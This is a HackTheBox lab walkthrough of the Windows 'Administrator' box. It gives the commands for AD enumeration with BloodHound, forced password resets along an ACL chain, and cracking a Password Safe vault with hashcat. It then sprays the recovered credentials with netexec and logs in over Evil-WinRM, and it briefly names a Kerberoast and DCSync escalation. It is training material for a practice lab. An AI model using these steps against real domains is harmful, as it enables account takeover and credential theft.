---
title: "Administrator"
date: 2026-09-14 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, medium, active-directory, bloodhound, acl-abuse, force-change-password, password-safe, password-spray, ftp]
image:
    path: /assets/Images/Administrator-avatar.png
    alt: Administrator
description: "Provided low-privilege creds open an Active Directory ACL chain — GenericAll resets one user, ForceChangePassword resets another into the Share Moderators group, whose FTP access yields a crackable Password Safe database holding the credentials that grant the user flag."
---
## Overview

Administrator is a medium-difficulty Windows box built as a pure Active Directory exercise: you start with credentials for the low-privileged user `olivia` and walk an ACL chain. BloodHound shows Olivia has `GenericAll` over `michael`, who in turn can `ForceChangePassword` on `benjamin`. Benjamin is a member of `Share Moderators`, which unlocks FTP access to a Password Safe backup. Cracking that database hands over credentials for several users, and a quick spray reveals that `emily` is valid — giving WinRM access and the user flag. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,84.0 233.7,122.8 150.0,150.0 137.1,167.8 129.1,143.2" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Pure AD ACL-abuse box: BloodHound-mapped GenericAll/ForceChangePassword chain into FTP, a cracked Password Safe DB, and a spray; highly realistic with no CVE and point-and-click tooling.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | FTP | Microsoft ftpd |
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | AD domain controller |
| 139/445/tcp | SMB | message signing required |
| 389/3268/tcp | LDAP | Domain: administrator.htb |
| 5985/tcp | WinRM | Microsoft HTTPAPI |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.42 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.42
```

The open ports — SMB, LDAP, Kerberos plus FTP — are textbook domain controller. The LDAP banner gives the domain name `administrator.htb`, which goes in `/etc/hosts`.

```bash
echo "10.10.11.42  administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The box hands us starting credentials `olivia:ichliebedich`. The fastest way to understand an AD environment with a valid login is to collect BloodHound data and look for object-control edges.

```bash
bloodhound-python -d administrator.htb -c All -u olivia -p 'ichliebedich' -ns 10.10.11.42 -k
```

Loading the JSON into BloodHound and inspecting Olivia's **Outbound Object Control** shows a clean chain:

- **Olivia** has `GenericAll` over **Michael** — full control, including resetting his password.
- **Michael** has `ForceChangePassword` over **Benjamin** — can reset Benjamin's password.
- **Benjamin** is a member of **Share Moderators**.

`GenericAll` and `ForceChangePassword` both let you set a target's password without knowing the current one, so the path forward is to walk down the chain one reset at a time.

## Foothold

**1 — Reset Michael via Olivia's GenericAll.** With full control over the object, change Michael's password:

```bash
net rpc password michael 'Newpass123!' -U administrator.htb/olivia%'ichliebedich' -S 10.10.11.42
```

**2 — Reset Benjamin via Michael's ForceChangePassword.** Now authenticating as Michael, push a password change onto Benjamin (the official writeup does this with PowerView's `Set-DomainUserPassword` from an Evil-WinRM session as Michael; `net rpc` works just as well):

```bash
net rpc password benjamin 'Newpass123!' -U administrator.htb/michael%'Newpass123!' -S 10.10.11.42
```

**3 — FTP as Benjamin → Password Safe backup.** Benjamin's `Share Moderators` membership grants FTP access, where a `Backup.psafe3` file is waiting:

```bash
ftp benjamin@10.10.11.42
# ftp> dir
# ftp> get Backup.psafe3
```

A `.psafe3` file is a Password Safe v3 database — an encrypted credential vault. The master password is crackable offline:

```bash
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

It falls quickly to `tekieromucho`. Opening the database (e.g. `pwsafe Backup.psafe3`) reveals three user entries — copy each password out:

```
alexander : [redacted]
emily     : [redacted]
emma      : [redacted]
```

**4 — Spray to find a valid login.** Not every recovered credential is necessarily live, so spray the three against SMB:

```bash
netexec smb 10.10.11.42 -u user.txt -p pass.txt --continue-on-success
```

Only `emily`'s credentials authenticate successfully. Emily is in the Remote Management Users group, so Evil-WinRM gives a shell:

```bash
evil-winrm -i 10.10.11.42 -u emily -p '[redacted]'
```

## User flag

From Emily's session, grab the flag:

```bash
type C:\Users\emily\Desktop\user.txt
# [redacted]
```

User access as `emily` is ours.

Privilege escalation — Emily's `GenericWrite` over Ethan, a targeted Kerberoast, and a DCSync to dump the Administrator hash — is left as an exercise; this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Administrator-avatar.png" alt="Administrator" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
